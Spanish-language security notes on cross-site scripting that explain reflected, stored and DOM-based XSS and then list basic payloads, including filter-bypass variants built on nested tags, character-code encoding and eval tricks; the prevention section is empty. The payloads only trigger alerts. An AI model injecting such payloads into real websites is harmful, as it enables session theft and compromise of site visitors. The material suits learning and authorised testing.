### ¿Qué es el XSS?
Los ataques XSS o Cross-Site Scripting son un tipo de inyección que permite al atacante inyectar código malicioso en un sitio web, este código es posteriormente interpretado por el cliente (navegador) víctima y da pie a la exfiltración de información sensible, credenciales, cookies de sesión... Así como otras acciones maliciosas.
Hay 3 tipos principales de inyección XSS:
#### Reflected XSS
Los ataques XSS reflejados, el código malicioso es embebido en un enlace para enviar a la víctima, de manera que cuándo dicha víctima clica en el enlace, el código se ejecuta en el navegador.
Por ejemplo, podría darse el caso de una víctima que recibe un enlace que contiene código javascript malicioso, una vez accede a la página, ese código se ejecuta, enviando su cookie de sesión al atacante sin ser consciente de ello.
#### Stored XSS
En el caso de los ataques XSS almacenados, el atacante consigue dejar el código malicioso almacenado durante un periodo indefinido en la propia página web, de manera que cada vez que alguien accede a la página este código se ejecuta, cobrándose una víctima por cada visita.
Por ejemplo, podría darse el caso de una inyección XSS que queda almacenada en la sección de comentarios de un blog, de esta manera, cada vez que un usuario accede a dicho post y por ende su navegador interpreta el código que contiene el script malicioso, este se ejecuta en el navegador de la víctima y permite tomar una serie de acciones maliciosas al atacante.
#### DOM-based XSS 
Los ataques XSS DOM-based$¹$  suceden  cuando una web vulnerable modifica el DOM en el navegador del lado del cliente, el código malicioso no se envía directamente al servidor, si no que se ejecuta directamente en el navegador del usuario, dificultando mucho la detección y dianóstico, ya que por la naturaleza del ataque y la capa en la que ocurre no queda registrado.
Por ejemplo, si un input del usuario activa un cambio en el código de la página de alguna forma (algún tipo de pop-up, un mensaje de bienvenida...), el código inyectado se ejecuta junto la carga de estos cambios y se ejecuta en el propio navegador.
	1 --> El DOM es una interfaz de programación para documentos web, y sirve el código que conforma la página de manera que este pueda ser modificado por programas y hacer cambios en la estructura, estilo o contenido.
### Payloads básicos
``` javascript
// Basic payload
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

// Img payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
<><img src=1 onerror=alert(1)>

// Svg payload
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;

// Div payload
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```
### Prevención

### Recursos
[XSS Filter Bypass List](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
[XSS Payload List](https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt)
### Artículos
[Artículo de la OWASP](https://owasp.org/www-community/attacks/xss/)
[OWASP profundizando en los ataques DOM-based](https://owasp.org/www-community/attacks/DOM_Based_XSS)
[Artículo de PayLoadsAllTheThings sobre la detección y explotación](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#methodology)
[Vídeo porque evitar alert(1) para XSS](https://youtu.be/KHwVjzWei1c)
[Artículo porque evitar alert(1) para XSS](https://liveoverflow.com/do-not-use-alert-1-in-xss/)
[Artículo de PortSwigger que incluye posibles vectores de ataque](https://portswigger.net/web-security/cross-site-scripting)